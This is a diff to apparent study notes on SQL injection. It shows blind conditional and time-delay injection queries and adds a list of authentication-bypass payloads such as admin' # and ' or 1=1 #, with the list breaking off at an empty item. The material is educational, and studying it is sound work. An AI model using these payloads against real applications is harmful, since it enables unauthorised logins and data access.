@@ -85,11 +85,22 @@ Case 2: Black box error based SQL Injection <br>
 Case 3. Blind SQL Injection (Conditional) <br>
 1. App return data based on True/False condition <br>
 Ex 1: "SELECT * FROM books WHERE bookid = -2 or 2>1# <br>
-Ex 2: "SELECT * FROM books WHERE bookid = -2 or 2>1 LIMIT 1# /* Return 1st result only */ <br>
+Ex 2: "SELECT * FROM books WHERE bookid = -2 or 2>1 LIMIT 1# /*Return 1st result only*/ <br>
 <br>
 Case 4: Blind SQL Injection (Time delay) <br>
 1. App return data after delaying certain time <br>
 Ex 1: "SELECT * FROM books WHERE bookid = -2 or sleep(10)#; <br>
 2. Condition time delay <br>
 Ex 2. SELECT IF(1=1,sleep(10),'a'); <br>
+
+#Authentication Bypass <br>
+1. admin' #  /*when user is admin */ <br>
+2. admin' -- /*space after double dash*/ <br>
+3. admin' or 1=1 # <br>
+4. admin' and 1=1 # <br>
+5. ' or 2>1 #  /*when username is not known*/ <br>
+6. " or 2<1 #   /*When user input is quoted under double dash*/ <br>
+7. ' or 1=1 LIMIT 1 # <br>
+8. ' | 1=1 # <br>
+9. 
     
